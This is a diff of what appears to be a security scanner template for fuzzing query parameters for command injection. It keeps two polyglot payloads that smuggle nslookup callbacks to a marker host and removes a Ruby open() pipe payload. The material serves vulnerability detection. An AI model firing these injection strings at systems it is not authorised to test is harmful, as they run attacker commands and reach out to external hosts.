@@ -26,8 +26,6 @@ requests:
         # polyglot for command injection from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
         - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
         - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
-        # ruby open() rce https://bishopfox.com/blog/ruby-vulnerabilities-exploits
-        - "|nslookup {{marker}}"
     
     fuzzing:
       - part: query
